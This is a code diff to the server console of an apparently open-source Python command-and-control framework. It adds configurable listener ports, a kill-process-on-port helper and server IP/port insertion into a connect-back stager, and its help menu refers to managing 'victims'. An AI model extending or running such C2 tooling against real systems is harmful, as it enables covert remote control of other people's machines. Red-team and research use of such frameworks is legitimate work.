@@ -10,6 +10,8 @@ from lib.logger import Logger
 from termcolor import colored
 import datetime
 import pathlib
+import signal
+import socket
 
 ## Provides command history like bash to input
 import readline
@@ -19,6 +21,7 @@ PATH = os.path.dirname(os.path.realpath(__file__))
 
 def parser():
 	parser = argparse.ArgumentParser(description='Python based C2')
+	parser.add_argument('-d', '--detached', help = "Doesn't automatically launch logs in another screen.", action='store_true')
 	parser.add_argument('-v', '--verbose', help = 'Generates exe', action='store_true')
 	args = parser.parse_args()
 	return args
@@ -32,7 +35,7 @@ def display_main_help_menu():
 	print(' --------------------------------------')
 	print('|          SERVER HELP MENU            |')
 	print(' --------------------------------------')
-	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in shared/tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
+	commands = {'http':'Starts a new http listener.' , 'listeners': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in shared/tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
 
 	for command in commands.keys():
 		print(colored(command,'cyan') + " - " + commands[command])
@@ -43,12 +46,19 @@ def docker():
 
 ## Stager.py has needs the server url where it will connect back and copies the new stager to tmp
 def fill_server_url():
-	print(colored("Enter server URL",'cyan'))
-	server_url = str(input())
+	print(colored("Enter server IP",'cyan'))
+	server_ip = str(input())
+
+	print(colored("Enter server port. Default is 8080",'cyan'))
+	server_port = str(input())
+
+	if server_port == '':
+		server_port = '8080'
+
 	stager_path = os.path.join(PATH,'stager.py')
 
 	stager_content = open(stager_path,'r').read()
-	stager_content = stager_content.replace("##SERVER_URL##",server_url)
+	stager_content = stager_content.replace("##SERVER_URL##",f"{server_ip}:{server_port}")
 
 	new_stager_path = os.path.join(PATH,'shared','tmp','stager.py')
 
@@ -134,6 +144,24 @@ def generate_stager(server_logger):
 		print(colored(f"exe generation failed ","red"))
 
 
+## Attempts to kill process running on a port
+def kill_process_on_port(port):
+	try:
+		process = subprocess.Popen(["lsof", "-i", ":{0}".format(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		stdout, stderr = process.communicate()
+		for process in str(stdout.decode("utf-8")).split("\n")[1:]:       
+		    data = [x for x in process.split(" ") if x != '']
+		    if (len(data) <= 1):
+		        continue
+
+		    os.kill(int(data[1]), signal.SIGKILL)
+
+		return True
+
+	except Exception as e:
+		print(colored(e,'yellow'))
+		return False
+
 def main(args,db_object,server_logger):
 	myclient = db_object.mongoclient
 
@@ -145,14 +173,37 @@ def main(args,db_object,server_logger):
 		cmd = str(input())
 
 		if cmd == 'http':
-			h = Listener(port="8080")
+			print(colored("Enter Listening Port. Default is 8080",'cyan'))
+			if docker(): print(colored('Please note , for docker the range of usable port is 8080-8100 due to increased startup times for forwarding. if you need more, adjust in the docker-compose.yml'))
+			port = str(input())
+
+			if port == '':
+				port='8080'
+
+			obj = Listener.listener_exists(port)
+
+			if not obj:
+				## Listener object doesn't already exists for that port
+				obj = Listener(port=port)
 			
-			ret = h.start_listener()
+			ret = obj.start_listener()
 
 			if ret:
 				server_logger.info_log("Started http listener.",'green')
 			else:
-				server_logger.info_log("Failed to start http listener. Check logs",'yellow')
+				server_logger.info_log("Failed to start http listener. Something is running on that port.",'yellow')
+
+				## killing with lsof doesn't work in docker
+				if not docker():
+					print(colored("Do you want to kill the process running on that port? Enter y or yes to do so.",'cyan'))
+					ans = str(input())
+
+					if ans.lower() in ['y','yes']:
+						if kill_process_on_port(port):
+							server_logger.info_log("Successfully killed the process on that port. Try running the listener again.",'green')
+						else:
+							server_logger.info_log("Couldn't kill the process on that port. Try running sudo \"ss -lp 'sport = :<port>'\" and get the process Id and kill it by - \" sudo kill <pid>\"",'yellow')
+
 
 		elif cmd == 'listeners':
 			Listener.show_listeners()
@@ -235,8 +286,9 @@ if __name__=="__main__":
 	server_logger = Logger(logdir='logs',logfile='logs',verbose=args.verbose )
 	server_logger.setup()
 
+	
 	## launches the log in new screen
-	server_logger.launch_logs_screen()
+	server_logger.launch_logs_screen(args)
 	
 
 	if docker(): server_logger.info_log(f"Please launch the server by running - {colored('sudo docker exec -it spyderc2_server python3 /home/attacker/SpyderC2/main.py','cyan')} ")
@@ -257,6 +309,7 @@ if __name__=="__main__":
 	Task.mongoclient = db_object.mongoclient
 
 
+	## The shared path will be the volume shared b/w host and docker
 	if not os.path.exists(os.path.join(PATH,'shared')):
 		os.mkdir(os.path.join(PATH,'shared'))
 
